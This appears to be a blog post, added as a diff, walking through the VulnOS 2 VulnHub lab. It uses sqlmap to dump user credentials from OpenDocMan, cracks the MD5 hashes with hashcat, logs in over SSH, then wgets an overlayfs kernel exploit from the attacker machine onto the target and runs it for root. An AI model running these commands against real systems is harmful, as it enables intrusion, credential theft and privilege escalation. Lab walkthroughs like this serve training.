@@ -1,0 +1,175 @@
+---
+layout: post
+title: "vulos2"
+date: 2016-07-20 13:36:54 -0500
+comments: true
+categories: [vulhub]
+---
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+* sqlmap
+* hash-identifier 
+* 
+
+###Vulnerability:
+* [OpenDocMan 1.2.7 - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/32075/)
+* [Linux Kernel 3.13.0 < 3.19 'overlayfs' Local Root Shell](https://www.exploit-db.com/exploits/37293/)
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.56.0/24`
+
+{% img  /images/blog/vulhub/vulos2/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.56.104 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.79.104 -p-`
+
+
+{% img  /images/blog/vulhub/vulos2/Selection_002.png   [title manually exploit [alt text]] %}
+
+port 22, 80 and 6667 are opening.
+
+use wfuzz to scan. Nothing interesting.
+
+use Niko to scan. Same.
+
+
+Check the webpage, looks like a link may be useful.
+
+{% img  /images/blog/vulhub/vulos2/Selection_003.png   [title manually exploit [alt text]] %}
+
+Double click it.
+
+{% img  /images/blog/vulhub/vulos2/Selection_004.png   [title manually exploit [alt text]] %}
+
+Exam the links. In `Document`, I found this:
+
+{% img  /images/blog/vulhub/vulos2/Selection_005.png   [title manually exploit [alt text]] %}
+
+Looks like path `/jabcd0cs/` is available.
+
+
+go to  `http://192.168.56.104/jabcd0cs/`, I found the app is OpenDocMan v1.2.7. 
+
+{% img  /images/blog/vulhub/vulos2/Selection_006.png   [title manually exploit [alt text]] %}
+
+`searchsploit opendocman`
+
+{% img  /images/blog/vulhub/vulos2/Selection_007.png   [title manually exploit [alt text]] %}
+
+got the exploit. Try the sql injection vulnerability:
+
+{% img  /images/blog/vulhub/vulos2/Selection_008.png   [title manually exploit [alt text]] %}
+
+```
+sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --level=5 --risk=3
+```
+
+{% img  /images/blog/vulhub/vulos2/Selection_009.png   [title manually exploit [alt text]] %}
+
+Now I know the database type is MySQL.
+
+Next try to dump all table names
+
+```
+sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --tables --dbms=mysql
+```
+
+
+{% img  /images/blog/vulhub/vulos2/Selection_010.png   [title manually exploit [alt text]] %}
+
+looks like `odm_user` is the table I want to take a look at.
+
+now dump columns from table `odm_user`
+
+
+`sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -T odm_user  --columns --dbms=mysql`
+
+
+{% img  /images/blog/vulhub/vulos2/Selection_011.png   [title manually exploit [alt text]] %}
+
+looks like `username` and `password`
+
+now time to dump all content from `username` and `password`,
+
+`sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -C username,password --dump --dbms=mysql`
+
+{% img  /images/blog/vulhub/vulos2/Selection_012.png   [title manually exploit [alt text]] %}
+
+use hash-identifier to detect hash type
+
+{% img  /images/blog/vulhub/vulos2/Selection_013.png   [title manually exploit [alt text]] %}
+
+looks like they are MD5.
+
+use hashcat to crack it
+
+`hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
+
+{% img  /images/blog/vulhub/vulos2/Selection_014.png   [title manually exploit [alt text]] %}
+
+only guest's password is cracked.
+
+Find a very good website to crack MD5 online http://md5cracker.org/, get the cracked password `webmin1980` for user webmin, and login:
+
+{% img  /images/blog/vulhub/vulos2/Selection_015.png   [title manually exploit [alt text]] %}
+
+not very helpful.
+
+Try to ssh to the box using webmin
+
+{% img  /images/blog/vulhub/vulos2/Selection_016.png   [title manually exploit [alt text]] %}
+
+
+get the bash:
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+first check the os version
+
+`uname -a`
+
+{% img  /images/blog/vulhub/vulos2/Selection_017.png   [title manually exploit [alt text]] %}
+
+
+`searchsploit 3.13.0`
+
+{% img  /images/blog/vulhub/vulos2/Selection_018.png   [title manually exploit [alt text]] %}
+
+try this exploit
+
+in Kali:
+
+```
+cp /usr/share/exploitdb/platforms/linux/local/37292.c /var/www/html/.
+service apache2 restart
+
+```
+
+in target:
+
+```
+wget http://192.168.56.101/37292.c .
+gcc 37292.c -o 37292
+./37292
+```
+
+{% img  /images/blog/vulhub/vulos2/Selection_018.png   [title manually exploit [alt text]] %}
+
+DONE
+
+
+
+
+
+
+
